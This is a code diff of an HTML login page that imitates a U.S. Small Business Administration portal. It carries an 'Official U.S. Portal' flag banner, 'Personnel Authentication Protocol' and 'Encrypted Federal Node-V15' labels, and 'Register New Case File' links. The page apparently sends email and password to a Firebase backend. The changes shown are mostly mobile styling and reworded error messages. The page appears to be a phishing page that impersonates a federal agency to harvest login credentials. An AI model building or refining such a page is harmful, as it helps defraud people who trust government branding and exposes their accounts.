@@ -3,95 +3,95 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>SBA Portal | Secure Login</title>
+    <title>SBA | Secure Login</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;700;900&display=swap');
         :root { --sba-blue: #002e6d; --sba-red: #cc0000; }
         body { font-family: 'Public Sans', sans-serif; background-color: #f1f5f9; color: #1e293b; }
         
-        /* Matching Logo Box from Register */
         .sba-logo-box { position: relative; display: inline-block; padding: 4px 6px; }
         .sba-logo-box::before { content: ""; position: absolute; top: 0; left: 0; right: 0; bottom: 4px; border-top: 2.5px solid var(--sba-blue); border-left: 2.5px solid var(--sba-blue); border-right: 2.5px solid var(--sba-blue); }
         .sba-logo-box::after { content: ""; position: absolute; bottom: 0; left: 0; right: 30%; height: 2.5px; background: var(--sba-red); }
 
-        /* Matching Card Constraints */
-        .auth-card { background: white; border-top: 4px solid var(--sba-blue); box-shadow: 0 4px 20px rgba(0,0,0,0.05); border-radius: 2px; }
+        .auth-card { background: white; border-top: 5px solid var(--sba-blue); box-shadow: 0 10px 25px rgba(0,0,0,0.1); border-radius: 4px; }
         
-        input { font-size: 14px !important; border-radius: 2px !important; transition: all 0.2s; }
-        input:focus { border-color: var(--sba-blue) !important; outline: none !important; background: #fff !important; }
+        /* Mobile Sharp Inputs (16px prevents auto-zoom) */
+        input { font-size: 16px !important; border-radius: 4px !important; transition: all 0.2s; height: 55px; }
+        input:focus { border-color: var(--sba-blue) !important; ring: 0 !important; outline: none !important; background: #fff !important; }
 
-        .btn-sba { background: var(--sba-blue); transition: all 0.2s; font-size: 11px; letter-spacing: 1px; font-weight: 900; }
-        .btn-sba:disabled { opacity: 0.6; cursor: not-allowed; }
+        .btn-sba { background: var(--sba-blue); color: white; height: 55px; font-size: 13px; letter-spacing: 1.5px; font-weight: 900; text-transform: uppercase; border-radius: 4px; transition: 0.3s; }
+        .btn-sba:active { transform: scale(0.97); background: #001a3d; }
     </style>
 </head>
 <body class="min-h-screen flex flex-col">
 
-    <div class="bg-[#f0f0f0] py-1.5 px-4 flex items-center gap-2 border-b border-gray-200">
-        <img src="https://upload.wikimedia.org/wikipedia/en/a/a4/Flag_of_the_United_States.svg" class="w-3.5 shadow-sm">
-        <span class="text-[9px] font-bold text-gray-500 uppercase tracking-tight">Official U.S. Government Portal</span>
+    <div class="bg-[#efefef] py-2 px-4 flex items-center gap-2 border-b border-gray-200">
+        <img src="https://upload.wikimedia.org/wikipedia/en/a/a4/Flag_of_the_United_States.svg" class="w-4 shadow-sm">
+        <span class="text-[10px] font-black text-gray-500 uppercase tracking-widest">Official U.S. Portal</span>
     </div>
 
-    <nav class="bg-white px-5 py-3 flex justify-between items-center border-b border-gray-100 sticky top-0 z-50">
+    <nav class="bg-white px-5 py-3 flex justify-between items-center border-b border-gray-100">
         <div class="flex items-center gap-2">
             <div class="sba-logo-box">
-                <span class="text-lg font-black text-[#002e6d] tracking-tighter uppercase">SBA</span>
+                <span class="text-xl font-black text-[#002e6d] tracking-tighter uppercase">SBA</span>
             </div>
-            <p class="text-[9px] font-black text-[#002e6d] uppercase leading-none hidden sm:block">Administration</p>
         </div>
-        <a href="register.html" class="text-[10px] font-black text-slate-400 hover:text-red-600 uppercase">Enroll Now</a>
+        <a href="register.html" class="text-[11px] font-black text-[#cc0000] hover:underline uppercase transition-all">Enroll Case</a>
     </nav>
 
-    <main class="flex-grow flex items-center justify-center p-4">
-        <div class="w-full max-w-[400px]"> <div class="auth-card p-6 md:p-10"> <div class="text-center mb-8">
+    <main class="flex-grow flex items-center justify-center p-5">
+        <div class="w-full max-w-[420px]">
+            <div class="auth-card p-6 md:p-10">
+                <div class="text-center mb-8">
                     <h2 class="text-2xl font-black text-slate-800 uppercase tracking-tighter">Portal Access</h2>
                     <p class="text-slate-400 text-[10px] font-bold uppercase tracking-[0.2em] mt-2">Personnel Authentication Protocol</p>
                 </div>
 
-                <div id="alertBox" class="hidden mb-6 p-4 bg-red-50 border-l-4 border-red-600 text-red-700 text-[11px] font-bold uppercase italic shadow-sm"></div>
+                <div id="alertBox" class="hidden mb-6 p-4 bg-red-50 border-l-4 border-red-600 text-red-700 text-[11px] font-black uppercase italic shadow-sm"></div>
 
                 <form id="loginForm" class="space-y-5">
                     <div>
-                        <label class="block text-[10px] font-black text-slate-400 uppercase tracking-widest mb-2">Account Email</label>
+                        <label class="block text-[10px] font-black text-slate-500 uppercase tracking-widest mb-1.5 ml-1">Account Email</label>
                         <div class="relative">
-                            <span class="absolute inset-y-0 left-0 pl-4 flex items-center text-slate-300">
-                                <i class="fas fa-user-shield text-xs"></i>
+                            <span class="absolute inset-y-0 left-0 pl-4 flex items-center text-slate-400">
+                                <i class="fas fa-user-shield"></i>
                             </span>
-                            <input type="email" id="email" required class="w-full pl-10 pr-4 py-3.5 bg-slate-50 border border-slate-200 outline-none" placeholder="Enter ID Email">
+                            <input type="email" id="email" required class="w-full pl-12 pr-4 bg-slate-50 border border-slate-200 outline-none" placeholder="Enter ID Email">
                         </div>
                     </div>
 
                     <div>
-                        <div class="flex justify-between items-center mb-2">
-                            <label class="block text-[10px] font-black text-slate-400 uppercase tracking-widest">Secure Passkey</label>
-                            <a href="forgot-password.html" class="text-[9px] font-black text-blue-700 uppercase hover:underline">Reset?</a>
+                        <div class="flex justify-between items-center mb-1.5">
+                            <label class="block text-[10px] font-black text-slate-500 uppercase tracking-widest ml-1">Secure Passkey</label>
+                            <a href="forgot-password.html" class="text-[9px] font-black text-blue-700 uppercase">Forgot?</a>
                         </div>
                         <div class="relative">
-                            <span class="absolute inset-y-0 left-0 pl-4 flex items-center text-slate-300">
-                                <i class="fas fa-lock text-xs"></i>
+                            <span class="absolute inset-y-0 left-0 pl-4 flex items-center text-slate-400">
+                                <i class="fas fa-lock"></i>
                             </span>
-                            <input type="password" id="pass" required class="w-full pl-10 pr-4 py-3.5 bg-slate-50 border border-slate-200 outline-none" placeholder="••••••••">
+                            <input type="password" id="pass" required class="w-full pl-12 pr-4 bg-slate-50 border border-slate-200 outline-none" placeholder="••••••••">
                         </div>
                     </div>
 
-                    <button type="submit" id="submitBtn" class="btn-sba w-full text-white py-4 shadow-xl uppercase mt-4">
+                    <button type="submit" id="submitBtn" class="btn-sba w-full shadow-lg mt-4">
                         Authorize Session
                     </button>
                 </form>
 
-                <div class="mt-8 pt-6 border-t border-slate-100 text-center">
+                <div class="mt-10 pt-6 border-t border-slate-100 text-center">
                     <p class="text-[10px] text-slate-400 font-bold uppercase mb-2">No active case found?</p>
-                    <a href="register.html" class="text-[#cc0000] font-black text-[11px] uppercase tracking-[0.2em] hover:text-red-700 transition-all">
-                        Register New Case File
+                    <a href="register.html" class="text-[#cc0000] font-black text-[12px] uppercase tracking-[0.2em] hover:text-red-700 transition-all">
+                        Register New Case File <i class="fas fa-arrow-right ml-1"></i>
                     </a>
                 </div>
             </div>
         </div>
     </main>
 
-    <footer class="py-6 text-center text-[9px] text-slate-400 font-bold uppercase tracking-[0.3em]">
-        <i class="fas fa-lock mr-2 text-slate-300"></i> Encrypted 256-Bit Federal Node-V15
+    <footer class="py-6 text-center text-[10px] text-slate-400 font-bold uppercase tracking-[0.4em]">
+        <i class="fas fa-shield-halved mr-2 text-slate-300"></i> Encrypted Federal Node-V15
     </footer>
 
     <script type="module">
@@ -110,7 +110,7 @@
             const pass = document.getElementById('pass').value;
 
             btn.disabled = true;
-            btn.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i> AUTHORIZING...';
+            btn.innerHTML = '<i class="fas fa-circle-notch fa-spin mr-2"></i> AUTHORIZING...';
 
             try {
                 const userCredential = await signInWithEmailAndPassword(auth, email, pass);
@@ -133,21 +133,18 @@
                 btn.innerText = "Authorize Session";
                 alertBox.classList.remove('hidden');
                 
+                // Detailed mobile-friendly error messages
                 if (error.code === 'auth/user-not-found') {
                     alertBox.innerText = "DENIED: Case file not found.";
                 } else if (error.code === 'auth/wrong-password') {
                     alertBox.innerText = "DENIED: Invalid passkey protocol.";
+                } else if (error.code === 'auth/invalid-credential') {
+                    alertBox.innerText = "DENIED: Credentials mismatch.";
                 } else {
-                    alertBox.innerText = "ACCESS DENIED: Credentials mismatch.";
+                    alertBox.innerText = "ACCESS ERROR: Check connection.";
                 }
             }
         };
-
-        function showAlert(msg) {
-            alertBox.innerText = msg;
-            alertBox.classList.remove('hidden');
-            window.scrollTo({ top: 0, behavior: 'smooth' });
-        }
     </script>
 </body>
 </html>
